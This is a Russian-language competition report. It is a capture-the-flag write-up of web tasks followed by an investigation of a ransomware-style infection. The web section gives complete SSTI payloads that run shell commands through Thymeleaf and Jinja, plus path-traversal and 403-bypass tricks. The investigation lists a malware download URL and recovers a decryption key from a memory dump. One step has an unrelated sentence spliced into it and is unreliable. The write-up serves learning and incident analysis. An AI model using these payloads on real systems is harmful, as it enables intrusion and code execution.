# RateupNTO

# Отчет

## Первый этап (CTF)

### Web 1
На сайте можно сделать только одно -- перейти по ссылке в 20 дне.
Тут есть подсказка, которая говорит, что влаг находится в `etc/secret`.
В URL есть параметр `file_type=`, что очень напоминает SSTI.
Добавляем много `../` перед путем `etc/secret` до тех пор, пока не найдем файл.


### Web 2
Открываем файл legacy.jar с помощью jd-gui. В папке BOOT-INF/classes в пакете com.server видим файл HelloController, который содержит эндпоинты сервера. Нам нужен /doc/{document}. Возможно, здесь есть что-то вроде SSTI для Spring ThymeleafView. Гуглим и находим полезную нагрузку. В коде сервера можно заметить, что флаг хранится в файле `flag`. Переходим по адресу `http://192.168.12.13:8090/doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat flag").getInputStream()).next()}__::..x` и получаем флаг!


### Web 3
В коде сервера app.py видим, что существует адрес `/flag`, но если на него перейти, то мы получим ошибку `403 Forbidden`. Гуглим способы обхода этой ошибки. Правильным адресом является `http://192.168.12.11:8001//flag`. Дальше нам нужно использовать SSTI уязвимость без использования запрещенных в коде сервера символов. В фильтре сервера есть недочёт: \w совпадает с любым символом слов ([a-zA-Z0-9_]), фильтры для {{, }}, [, ] не работают. Гуглим. Правильный payload: `{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}`.
По адресу `http://192.168.12.11:8001//flag?name={{self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()}}` будет флаг.


## Второй этап

### №1
Вирус попал по не внимательности человека, человек открыл ссылку и скачал "обновление" и тем самым подхватил вирус.
Исходя из истории браузера он заходил в почту в 18.41 а файл появился на пк в 18.43.

### №2
Ответ можно найти в журнале событий (eventvwr.msc) в разделе логов powershell.
В 18.42.04 вредоносный файл был скачан с этого адреса http://95.169.192.220:8080/prikol.exe.

### №4
Тут используется обнаружение отладчика, при запуске x64dbg и попытке запустить дальше код, появляется командная строка, сразу проподает, и идет в самое начало. Появляется сообщение, которое \
`IsDebuggerPresent`. Эта функция проверяет, запущена ли отладка для текущего процесса, и выполняет несколько операций, связанных с управлением памятью. Если отладка запущена, функция возвращает 1, иначе она выполняет некоторые действия с кучей и возвращает 0. Этот код, вероятно, является частью системы защиты от отладки.

### №5
Скачав файл pass.txt.ransom и выполнив команду джоном `john -wordlist="/home/kali/Downloads/rockyou.txt" "/home/kali/Desktop/pass.txt.ransom"` получил вывод:
```
Using default input encoding: UTF-8 Loaded 1 password hash (cryptoSafe [AES-256-CBC]) Will run 12 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:00:01 DONE (2024-03-20 17:42) 0g/s 9756Kp/s 9756Kc/s 9756KC/s 32110017..*7¡Vamos! Session completed.
```
=> шифр **AES-256-CBC**

Строки в исполняемом файле, которые доказывают алгоритм шифрования:
- this object requires an IV
- StreamTransformationFilter: invalid PKCS #7 block padding found

### №6,8
1) Вирус убивает все процессы, которые в нем заложены (Taskmgr.exe, ResourceHacker.exe и т. д.). Чтобы это обойти нужно переименовать утилиту, например, Process Explorer, в что-то другое.
2) Запускаем вирус, замораживаем его с помощью Process Explorer и делаем дамп памяти.
3) Анализруем полученный дамп с помощью утилиты `strings` и отсекаем все строки, длина которых не равна 32 символам. Команда:уязмимость “Вредоносные вложения в электронных письмах” Из хрома видно что он заходил на рамблер, и после этогго появился файл rjomba, со времени 18.40-18.43 `strings Rjomba.dmp | grep -E '^.{32}$'`.
4) Находим две подозрительные строки: amogusamogusamogusamogusamogusam и sugomasugomasugomasugomasugomasu
5) Выполняем поиск по `amogusamogusamogusamogusamogusam` и находим рядом строку `ababab`.
6) Продолжаем ее до 16 символов. Получаем IV: `abababababababab`.
Пробуем расшифровать pass.txt. Ошибки не возникает только в случае использования amogusamogusamogusamogusamogusam.

Используется ключ: `amogusamogusamogusamogusamogusam`

Содержимое pass.txt:
```
sFYZ#2z9VdUR9sm`3JRz
```


### №7
Отправляет он на телеграмм, с помощью API. Это показанно если зайти в `virus total > behavior`
